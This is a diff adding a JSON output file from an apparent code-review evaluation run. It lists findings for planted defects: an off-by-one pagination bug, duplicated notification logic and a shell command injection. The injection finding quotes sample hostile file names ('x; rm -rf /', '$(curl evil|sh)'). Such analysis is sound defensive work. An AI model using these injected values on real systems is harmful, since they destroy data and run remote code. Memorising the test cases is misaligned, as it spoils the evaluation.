@@ -1,0 +1,112 @@
+{
+  "confirmation_reruns": [],
+  "invocations": [
+    {
+      "case_id": null,
+      "run": {
+        "cases": [
+          {
+            "id": "correctness-off-by-one-pagination",
+            "input_kind": "patch",
+            "produced_findings": [
+              {
+                "claim": "Pagination returns page_size + 1 items per page The changed code is `end = offset + page_size + 1` followed by `return items[offset:end]`. Python slicing excludes the end index, so `items[offset:offset+page_size]` was already exactly `page_size` items. The extra `+ 1` includes one more item. With `items=list(range(10))`, `page_number=1`, `page_size=3`, the function returns `[0, 1, 2, 3]`, four items instead of three. Page 2 returns `[3, 4, 5, 6]`, so item 3 appears on both pages. Every page except possibly the last returns one extra item. Consecutive pages overlap by one item, so callers see duplicate records. Callers that expect at most `page_size` items get more.",
+                "extra": {
+                  "defect_kind": "off-by-one",
+                  "evidence_quotes": [
+                    "end = offset + page_size + 1",
+                    "return items[offset:end]",
+                    "items[offset:offset+page_size]",
+                    "page_size",
+                    "+ 1",
+                    "items=list(range(10))",
+                    "page_number=1",
+                    "page_size=3",
+                    "[0, 1, 2, 3]",
+                    "[3, 4, 5, 6]"
+                  ]
+                },
+                "location": {
+                  "lines": {
+                    "end": 4,
+                    "start": 3
+                  },
+                  "path": "app/pagination.py"
+                },
+                "severity": "P1"
+              }
+            ],
+            "status": "executed"
+          },
+          {
+            "id": "no-op-comment-and-rename",
+            "input_kind": "patch",
+            "produced_findings": [],
+            "status": "executed"
+          },
+          {
+            "id": "quality-duplicated-branch-logic",
+            "input_kind": "patch",
+            "produced_findings": [
+              {
+                "claim": "Duplicated message-formatting logic across notification branches The new `elif kind == \"sms\"` branch repeats the `email` branch's structure at `app/notify.py:2-4`. Both call `msg = format_message(user)` and then send through a channel-specific function. Only the sender function and the address attribute (`user.email` vs `user.phone`) differ. Each new channel will add another copy of the format-then-send sequence. A later change, such as per-channel formatting, error handling or logging, then has to be made in every branch, and the branches can drift apart.",
+                "extra": {
+                  "defect_kind": "duplicated-branch-logic",
+                  "evidence_quotes": [
+                    "elif kind == \"sms\"",
+                    "email",
+                    "app/notify.py:2-4",
+                    "msg = format_message(user)",
+                    "user.email",
+                    "user.phone"
+                  ]
+                },
+                "location": {
+                  "lines": {
+                    "end": 7,
+                    "start": 5
+                  },
+                  "path": "app/notify.py"
+                },
+                "severity": "P2"
+              }
+            ],
+            "status": "executed"
+          },
+          {
+            "id": "security-command-injection",
+            "input_kind": "patch",
+            "produced_findings": [
+              {
+                "claim": "Shell command injection via `name` in `make_archive` Line 5 builds `cmd = f\"tar -czf {name}.tar.gz data/\"` and line 6 runs it with `shell=True`. `name` is not quoted, validated, or escaped. The previous version passed `name + \".tar.gz\"` as a single list element with no shell, so `name` could not be reinterpreted as shell syntax. The repository has no other caller of `make_archive` and no validation of `name`, so I could not confirm that `name` is trusted. Any `name` containing `;`, `&&`, `$(...)`, backticks, or a newline runs arbitrary commands with the privileges of the process. For example, `x; rm -rf /` or `$(curl evil|sh)`. A name with spaces or a leading `-` also changes the `tar` arguments, and that happens even with benign input.",
+                "extra": {
+                  "defect_kind": "command-injection",
+                  "evidence_quotes": [
+                    "cmd = f\"tar -czf {name}.tar.gz data/\"",
+                    "shell=True",
+                    "name",
+                    "name + \".tar.gz\"",
+                    "name",
+                    "make_archive",
+                    "name",
+                    "name"
+                  ]
+                },
+                "location": {
+                  "lines": {
+                    "end": 6,
+                    "start": 5
+                  },
+                  "path": "app/backup.py"
+                },
+                "severity": "P0"
+              }
+            ],
+            "status": "executed"
+          }
+        ],
+        "ok": true
+      }
+    }
+  ]
+}
